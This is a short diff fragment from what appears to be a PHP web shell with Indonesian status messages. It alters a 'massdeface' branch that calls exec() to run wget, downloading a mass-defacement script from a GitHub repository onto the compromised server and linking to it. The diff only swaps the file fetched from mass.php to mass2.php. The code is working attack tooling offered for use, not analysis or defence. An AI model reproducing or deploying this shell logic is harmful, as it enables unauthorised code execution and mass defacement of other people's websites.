@@ -320,7 +320,7 @@
 									echo '<center>gagal upload !</center>';
 								}
 						}else if ($_POST['lucknut'] == 'massdeface') {
-								$exec=exec('wget https://raw.githubusercontent.com/rizkyfarhanrr/kerang/main/mass.php -O mass.php');
+								$exec=exec('wget https://raw.githubusercontent.com/rizkyfarhanrr/kerang/main/mass2.php -O mass.php');
 								if(file_exists('./mass.php')){
 									echo '<center><a href=./mass.php target="_blank"> mass.php </a> upload sukses !</center>';
 								} else {
